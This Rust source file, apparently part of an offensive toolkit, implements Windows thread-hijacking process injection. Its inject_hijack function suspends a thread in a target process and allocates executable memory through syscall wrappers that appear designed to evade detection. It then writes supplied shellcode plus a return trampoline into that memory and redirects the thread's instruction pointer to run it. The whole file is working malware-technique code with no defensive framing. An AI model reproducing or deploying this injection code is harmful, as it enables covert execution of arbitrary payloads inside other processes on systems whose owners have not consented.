#![allow(unused)]

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE},
    System::{
        Diagnostics::{
            Debug::{GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64},
            ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32,
                TH32CS_SNAPTHREAD,
            },
        },
        Threading::{
            OpenThread, ResumeThread, SuspendThread,
            THREAD_GET_CONTEXT, THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
        },
    },
};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

#[cfg(target_os = "windows")]
pub fn inject_hijack(pid: u32, shellcode: &[u8]) -> super::InjectResult {
    use crate::syscall::{nt_alloc, nt_write};
    use core::ptr::null_mut;

    let proc = super::open_process_rw(pid).ok_or("open failed")?;

    // Find first thread in target process
    let tid = find_thread(pid).ok_or("no thread found")?;

    let thread_handle = unsafe {
        OpenThread(
            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
            FALSE,
            tid,
        )
    };
    if thread_handle == 0 {
        unsafe { CloseHandle(proc as _) };
        return Err("OpenThread failed");
    }

    unsafe { SuspendThread(thread_handle as _) };

    // Trampoline appended after shellcode: mov rax, <orig_rip> (10 bytes) + jmp rax (2 bytes) = 12 bytes
    const TRAMPOLINE_LEN: usize = 12;
    let total_size = shellcode.len() + TRAMPOLINE_LEN;
    let mut base: *mut u8 = null_mut();
    let mut alloc_size: usize = total_size.max(0x1000);
    let status = unsafe {
        nt_alloc(proc, &mut base, 0, &mut alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    };
    if status < 0 || base.is_null() {
        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
        return Err("alloc failed");
    }

    let mut ctx: CONTEXT = unsafe { core::mem::zeroed() };
    ctx.ContextFlags = CONTEXT_FULL_AMD64;
    if unsafe { GetThreadContext(thread_handle as _, &mut ctx) } == 0 {
        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
        return Err("GetThreadContext failed");
    }
    let orig_rip = ctx.Rip;

    // Build full payload: shellcode || REX.W mov rax,imm64 || jmp rax
    // mov rax, imm64 = 48 B8 <8 bytes LE> (10 bytes)
    // jmp rax        = FF E0               (2 bytes)
    let mut full_payload = Vec::with_capacity(total_size);
    full_payload.extend_from_slice(shellcode);
    full_payload.push(0x48); // REX.W
    full_payload.push(0xB8); // mov rax, imm64
    full_payload.extend_from_slice(&orig_rip.to_le_bytes());
    full_payload.push(0xFF); // jmp rax (high byte)
    full_payload.push(0xE0); // jmp rax (mod/rm)

    let mut written: usize = 0;
    let status = unsafe {
        nt_write(proc, base, full_payload.as_ptr(), full_payload.len(), &mut written)
    };
    if status < 0 {
        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
        return Err("write failed");
    }

    ctx.Rip = base as u64;
    if unsafe { SetThreadContext(thread_handle as _, &ctx) } == 0 {
        unsafe { ResumeThread(thread_handle as _); CloseHandle(thread_handle as _); CloseHandle(proc as _); }
        return Err("SetThreadContext failed");
    }

    unsafe {
        ResumeThread(thread_handle as _);
        CloseHandle(thread_handle as _);
        CloseHandle(proc as _);
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn find_thread(pid: u32) -> Option<u32> {
    use windows_sys::Win32::Foundation::INVALID_HANDLE_VALUE;

    let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) };
    if snap == INVALID_HANDLE_VALUE {
        return None;
    }
    let mut entry: THREADENTRY32 = unsafe { core::mem::zeroed() };
    entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
    let mut found = None;
    if unsafe { Thread32First(snap, &mut entry) } != 0 {
        loop {
            if entry.th32OwnerProcessID == pid {
                found = Some(entry.th32ThreadID);
                break;
            }
            entry = unsafe { core::mem::zeroed() };
            entry.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
            if unsafe { Thread32Next(snap, &mut entry) } == 0 {
                break;
            }
        }
    }
    unsafe { CloseHandle(snap as _) };
    found
}
